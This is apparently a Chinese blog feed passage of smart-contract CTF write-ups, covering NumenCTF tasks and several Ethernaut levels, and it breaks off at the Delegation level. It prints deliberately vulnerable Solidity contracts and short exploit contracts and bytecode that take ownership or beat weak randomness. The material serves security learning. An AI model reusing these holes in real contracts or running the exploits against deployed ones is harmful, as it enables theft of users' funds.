    <content type="html"><![CDATA[<p>合约审计比赛</p><span id="more"></span><h1 id="wp">wp</h1><p><a href="https://cn-sec.com/archives/1645084.html">NUMEN CTF writeupby ChaMd5 | CN-SEC 中文网</a></p><p><a href="https://defihacklabs.substack.com/">DeFiHackLabs’s Substack| SunWeb3Sec | Substack</a></p><h1 id="simplecall">SimpleCall</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract ExistingStock &#123;</span><br><span class="line"></span><br><span class="line">address public owner;</span><br><span class="line">    address private reserve;</span><br><span class="line"></span><br><span class="line">string public name = &quot;Existing Stock&quot;;</span><br><span class="line">string public symbol = &quot;ES&quot;;</span><br><span class="line">uint256 public decimals = 18;</span><br><span class="line">uint256 public totalSupply = 200000000000;</span><br><span class="line">    uint8 public frequency = 1;</span><br><span class="line"></span><br><span class="line">bool public Lock = false;</span><br><span class="line">bool public result;</span><br><span class="line">bool public flag;</span><br><span class="line"></span><br><span class="line">event Approval(address indexed from, address indexed to, uint number);</span><br><span class="line">event Transfer(address indexed from, address indexed to, uint number);</span><br><span class="line">event Deposit(address indexed to, uint number);</span><br><span class="line">event Withdraw(address indexed from, uint number);</span><br><span class="line">    event Target(address indexed from, bool result);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mapping (address =&gt; uint) public balanceOf;</span><br><span class="line">mapping (address =&gt; mapping (address =&gt; uint)) public allowance;</span><br><span class="line"></span><br><span class="line">constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    balanceOf[owner] = totalSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function approve(address to, uint number) public returns (bool) &#123;</span><br><span class="line">    allowance[msg.sender][to] = number;</span><br><span class="line">    emit Approval(msg.sender, to, number);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balanceOf[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balanceOf[msg.sender] -= _value;</span><br><span class="line">    balanceOf[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">function transferFrom(address from, address to, uint number) public returns (bool)&#123;</span><br><span class="line"></span><br><span class="line">        require(balanceOf[from] &gt;= number);</span><br><span class="line"></span><br><span class="line">    if (from != msg.sender &amp;&amp; allowance[from][msg.sender] != uint256(-1)) &#123;</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= number);</span><br><span class="line">        allowance[from][msg.sender] -= number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    balanceOf[from] -= number;</span><br><span class="line">    balanceOf[to] += number;</span><br><span class="line"></span><br><span class="line">    emit Transfer(from, to, number);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function privilegedborrowing(uint256 value,address secure,address target,bytes memory data) public &#123;</span><br><span class="line">        require(Lock == false &amp;&amp; value &gt;= 0 &amp;&amp; value &lt;= 1000);</span><br><span class="line">    balanceOf[address(this)] -= value;</span><br><span class="line">    balanceOf[target] += value;</span><br><span class="line"></span><br><span class="line">    address(target).call(data);</span><br><span class="line"></span><br><span class="line">    Lock = true; </span><br><span class="line"></span><br><span class="line">    require(balanceOf[target] &gt;= value);</span><br><span class="line">    balanceOf[address(this)] += value;</span><br><span class="line">    balanceOf[target] -= value;</span><br><span class="line"></span><br><span class="line">    Lock = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint number) public &#123;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;= number);</span><br><span class="line">    balanceOf[msg.sender] -= number;</span><br><span class="line">    (msg.sender).transfer(number);</span><br><span class="line">    emit Withdraw(msg.sender, number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setflag() public &#123;</span><br><span class="line">    if(balanceOf[msg.sender] &gt; 200000 &amp;&amp; allowance[address(this)][msg.sender] &gt; 200000)&#123;</span><br><span class="line">flag = true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isSolved() public view returns(bool)&#123;</span><br><span class="line">    return flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要满足的是：</p><p><img src="/images/NumenCTF/image-20230416224902698.png" alt="image-20220828145823279"></p><p>balanceOf会下溢，利用transfer函数可以满足第一个条件：</p><p><img src="/images/NumenCTF/image-20230416230045087.png" alt="image-20230416230045087"></p><p>只有approve能修改allowance，但是发起方只能是msg.sender</p><p><img src="/images/NumenCTF/image-20230404105532045.png" alt="image-20230404105532045"></p><p>privilegeborrowing存在任意地址的call调用，调用后会使得msg.sender改为target，所以可以满足第二个条件</p><p><img src="/images/NumenCTF/image-20230404105113104.png" alt="image-20230404105113104"></p><p><img src="/images/NumenCTF/image-20230330182715865.png" alt="image-20230330182715865"></p><p><img src="/images/NumenCTF/JMFR4%7B6%5BS%5DQ4O8W0YE4VDEU.png" alt="img"></p><h1 id="counter">counter</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    constructor(bytes memory code) &#123; </span><br><span class="line">        assembly &#123; return (add(code, 0x20), mload(code)) &#125; </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract SmartCounter&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    address public target;</span><br><span class="line">    bool flag=false;</span><br><span class="line">    constructor(address owner_)&#123;</span><br><span class="line">        owner=owner_;</span><br><span class="line">    &#125;</span><br><span class="line">    function create(bytes memory code) public&#123;</span><br><span class="line">        require(code.length&lt;=24);</span><br><span class="line">        target=address(new Deployer(code));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function A_delegateccall(bytes memory data) public&#123;</span><br><span class="line">        (bool success,bytes memory returnData)=target.delegatecall(data);</span><br><span class="line">        require(owner==msg.sender);</span><br><span class="line">        flag=true;</span><br><span class="line">    &#125;</span><br><span class="line">    function isSolved() public view returns(bool)&#123;</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先学一下solidity的内存布局<a href="https://www.jianshu.com/p/f01a5790e8cb">Solidity - 内存布局 - 简书(jianshu.com)</a></p><p>delegatecall调用的时候我们的地址会变成tx.origin，又由于owner在slot0，所以把tx.origin存到slot0即可满足owner=msg.sender。构造的code为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ORIGIN</span><br><span class="line">PUSH1 0x00</span><br><span class="line">SSTORE</span><br><span class="line"></span><br><span class="line">32600055</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;合约审计比赛&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/categories/blockchain/"/>
    
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>ethernaut</title>
    <link href="http://sh1k4ku.github.io/2023/04/03/ethernaut/"/>
    <id>http://sh1k4ku.github.io/2023/04/03/ethernaut/</id>
    <published>2023-04-02T16:00:00.000Z</published>
    <updated>2023-04-17T02:43:58.420Z</updated>
    
    <content type="html"><![CDATA[<p>打靶场的记录</p><span id="more"></span><h1 id="hello-ethernaut"><strong>Hello Ethernaut</strong></h1><p>连接小狐狸后按照提示做即可</p><p><img src="/images/ethernaut/image-20230321104045420.png" alt="image-20230321104045420"></p><p>然后提交示例（作者好有意思啊</p><p><img src="/images/ethernaut/image-20230321104122333.png" alt="image-20230321104122333"></p><p>过关后还能得到源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line"></span><br><span class="line">  string public password;</span><br><span class="line">  uint8 public infoNum = 42;</span><br><span class="line">  string public theMethodName = &#x27;The method name is method7123949.&#x27;;</span><br><span class="line">  bool private cleared = false;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _password) &#123;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;You will find what you need in info1().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info1() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&#x27;hello&#x27;))) &#123;</span><br><span class="line">      return &#x27;The property infoNum holds the number of the next info method to call.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#x27;Wrong parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info42() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;theMethodName is the name of the next method.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;If you know the password, submit it to authenticate().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function authenticate(string memory passkey) public &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">      cleared = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCleared() public view returns (bool) &#123;</span><br><span class="line">    return cleared;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="fallback"><strong>Fallback</strong></h1><p>合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标：</p><ul><li>成为owner</li><li>清空合约账户</li></ul><p>可以看到在withdraw函数可以直接转走合约地址的余额，但是要首先成为owner；同时，有两个地方可以成为owner：</p><ol type="1"><li><p>contribute，但限定了每次传入的数据，要满足条件的话需要执行10^6次</p></li><li><p>receive，这是一个特殊的函数，当向合约发送数据时会被自动调用。而且条件只需要让传入的数据和数组里的值大于0即可。同时，官方文档是这么描述receive的：</p><p><img src="/images/ethernaut/image-20230405230527117.png" alt="image-20230405230527117"></p><p>那么我们需要执行的操作就是，先调用contribute使得contributions[msg.sender]&gt;0，然后再向合约发送wei，再调用withdraw转走合约余额。</p><p>注意，我们向合约发送的单位是wei，而题中的单位为ether：</p><p><img src="/images/ethernaut/image-20230405230900958.png" alt="image-20230405230900958"></p><p>修改owner：</p><p><img src="/images/ethernaut/image-20230405230830479.png" alt="image-20230405230830479"></p></li></ol><p>可以看到owner已经被修改，然后即可通关。</p><h1 id="fallout">Fallout</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求是成为owner。</p><p>这关更简单了，直接调用Fal1out就行了。</p><p>原来背景是有一家公司改了合约名但是没改构造函数的名字，损失++</p><h1 id="coin-flip"><strong>Coin Flip</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标：猜对硬币10次</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlip&#123;</span><br><span class="line">    function flip(bool _guess) external returns(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    CoinFlip interact;</span><br><span class="line"></span><br><span class="line">    constructor(address _address)&#123;</span><br><span class="line">        interact = CoinFlip(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool _guess = coinFlip == 1 ? true : false;   </span><br><span class="line">        interact.flip(_guess);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交互10次即可。</p><p>背景指出在区块链上生成随机数是很难的，建议用<a href="https://docs.chain.link/docs/get-a-random-number">ChainlinkVRF</a>之类的</p><h1 id="telephone"><strong>Telephone</strong></h1><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标是要成为合约的owner，让tx.origin != msg.sender成立。</p><p>二者的区别:</p><ul><li>tx.origin会遍历整个调用栈并返回最初发送调用（或交易）的帐户的地址。</li><li>msg.sender为直接调用智能合约功能的帐户或智能合约的地址</li></ul><p>简单的说，只要写一个合约去调用changeOwner函数，那么msg.sender就会是合约地址，而tx.origin仍然是我的账户的地址，就可以满足判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone&#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    Telephone tele;</span><br><span class="line">    constructor(address _address)&#123;</span><br><span class="line">        tele = Telephone(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function atta() public&#123;</span><br><span class="line">        tele.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做完后题目还给了个攻击案例：</p><p><img src="/images/ethernaut/image-20230406112041546.png" alt="image-20230406112041546"></p><h1 id="token"><strong>Token</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下溢的洞，直接转账就行。</p><h1 id="delegation"><strong>Delegation</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: 